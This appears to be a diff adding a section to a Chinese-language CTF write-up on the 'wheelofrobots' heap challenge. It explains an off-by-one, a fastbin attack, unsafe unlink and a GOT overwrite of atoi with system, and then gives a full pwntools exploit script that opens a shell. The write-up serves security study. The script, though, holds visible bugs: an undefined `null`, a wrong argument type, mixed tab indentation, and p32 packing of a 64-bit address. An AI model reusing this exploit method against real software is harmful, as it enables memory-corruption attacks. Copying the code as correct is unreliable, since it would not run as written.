@@ -384,3 +384,174 @@ if __name__ == '__main__':
     main()
 ```
 
+
+
+## 0x23 wheelofrobots && unsafe unlink …
+
+日常 checksec 一下：
+
+```sh
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+简单的分析一下，得到以下结论：没有开启 `PIE`，可以修改 `got` 表。
+
+
+
+### 0x231 程序分析
+
+老规矩，先上的流程图。
+
+![wheelofrobots_process](/image/2019-05-24-linux_pwn_heap/wheelofrobots_process.png)
+
+经过简单的分析，现在将一些函数存在的问题进行一个简单的说明。
+
+`create_robots`：
+
+1. 在选择创建 robots 的时候存在一个 `off by one` 漏洞，可以恰好溢出到第二种类型的 `robot` 的 `inuse` 位，这里的 `inuse` 不是指的 `chunk` 的 `inuse`，而是程序作者为每个 `robot` 创建的 `inuse` 。
+
+注意：这里一共可以创建 三个 `robot` 。
+
+`delete_robots`：
+
+1. 这里删除 `robot` 的时候，并没有清空在 `.bss` 保存的地址。
+2. 同时也没有清空保存当前类型 `robot` 的 `chunk` 大小值的地址。 
+
+`show_robots`：
+
+1. 这个函数只有当创建了三个 `robot` 才能够执行。
+2. 这里会随机的输出这三个中的一个 `chunk` 的地址。
+3. 当输出了地址，就会调用 `exit` 函数退出。（相当于这里基本不可用了）
+
+
+
+### 0x232 漏洞利用
+
+有个上面三个函数中的问题，我们就可以总结利用一下思路了。
+
+1. 首先利用我们可以利用 `off by one` 实现 `fastbin attack`
+2. 利用 `fastbin attack` 可以将堆分配到 `.bss` 保存 `size` 的位置，实现 `heap overflow` 。
+
+3. 利用 `unlink` 将保存 `chunk ptr` 的进行修改，实现任意地址写入。
+4. 利用 `任意地址写入` 修改 `got 表` ，得到 `shell` 。
+
+`poc` :
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+
+
+def create_robots(exp_file, robots_nums, robots_name_len=null):
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline(str(1))
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline(str(robots_nums))
+    if robots_nums == 2:
+        exp_file.recvuntil("Increase Bender's intelligence:")
+        exp_file.sendline(str(robots_name_len))
+    elif robots_nums == 3:
+        exp_file.recvuntil("Increase Robot Devil's cruelty: ")
+        exp_file.sendline(str(robots_name_len))
+    elif robots_nums == 6:
+        exp_file.recvuntil("Increase Destructor's powerful: ")
+        exp_file.sendline(str(robots_name_len))
+    else:
+        return
+
+
+def delete_robots(exp_file, robots_nums):
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline(str(2))
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline(str(robots_nums))
+
+
+def edit_robots(exp_file, robots_nums, content_value):
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline(str(3))
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline(str(robots_nums))
+    exp_file.recvuntil("Robot's name:")
+    exp_file.send(content_value)
+
+
+def overwrite_inuse(exp_file, inuse_nums):
+    payload_1 = "a"*4 + inuse_nums
+    create_robots(exp_file, payload_1)
+
+
+def main():
+    debug = 1
+    if debug:
+        exp_file = process("./wheelofrobots")
+        elf_file = ELF("./wheelofrobots")
+        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+    # This is use "UAF" to make some memmory to trigger "fastbin attack"
+    create_robots(exp_file, 2, 1)
+    delete_robots(exp_file, 2)
+    overwrite_inuse(exp_file, "\x01")
+    payload_1 = p32(0x0000000000603138)
+    edit_robots(exp_file, 2, payload_1)
+    create_robots(exp_file, 3, 0x21)
+
+    # Trigger fastbin attack
+    create_robots(exp_file, 1)
+    overwrite_inuse(exp_file, "\x00")
+    create_robots(exp_file, 2, 1)
+
+    # Let robots_counts empty
+    delete_robots(exp_file, 1)
+    delete_robots(exp_file, 3)
+
+    # Now, we need use heap_overflow to make some memory to trigger unsafe_unlink
+    create_robots(exp_file, 6, 3)
+    payload_2 = p64(0x500)
+    edit_robots(exp_file, 2, payload_2)
+    create_robots(exp_file, 3, 7)
+    payload_3 = p64(0x0) + p64(0x41)
+    payload_3 += p64(0x00000000006030E8 - 0x18) + p64(0x00000000006030E8 - 0x10) + p64(0x20)
+    payload_3 += "a" * (0x40 - len(payload_3))
+    payload_3 += p64(0x40) + p64(0xa0)
+    edit_robots(exp_file, 6, payload_3)
+
+    # Trigger unlink
+    delete_robots(exp_file, 3)
+    create_robots(exp_file, 4)
+
+    # Leak the base address of libc and write the address of the system function to atoi in the got table
+    payload_4 = p64(0x0) * 2
+    payload_4 += p64(elf_file.got['free'])
+    payload_4 += p64(elf_file.got['atoi'])
+    payload_4 += p64(elf_file.got['puts'])
+    edit_robots(exp_file, 6, payload_4)
+	payload_5 = p64(elf_file.plt['puts'])
+    edit_robots(exp_file, 4, payload_5)
+	delete_robots(exp_file, 2)
+    libc_file.address = u64(exp_file.recv(6) + "\x00"*2) - libc_file.symbols['puts']
+    payload_6 = p64(libc_file.symbols['system'])
+    edit_robots(exp_file, 6, payload_6)
+
+    # excute atoi("/bin/bash") >> system("/bin/bash")
+    exp_file.recvuntil("Your choice :")
+    exp_file.sendline("bash")
+    exp_file.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+
+### 0x233 遇到的坑
+
+调试这个程序的时候我遇到一个很坑的问题，就是我一直对着 `glibc_2.23` 原版的源码进行参照进行调试的，但是这样就遇见问题了，unlink 的时候报了一个错误，错误信息为： `corrupted size vs. prev_size` ，但是我在 `glibc_2.23` 原版源码中并没有发现这句错误信息，这样就很烦。
+
+经过一段时间的挣扎，我发现 `ubuntu 16.04` 自带的 `libc` 虽然也是 `glibc_2.23` 的，但是它是打过一些补丁的，所以和原版的 `glibc_2.23` 是有一定的区别的。具体的对比参考 [**这里**](<https://launchpad.net/ubuntu/+source/glibc>) 。
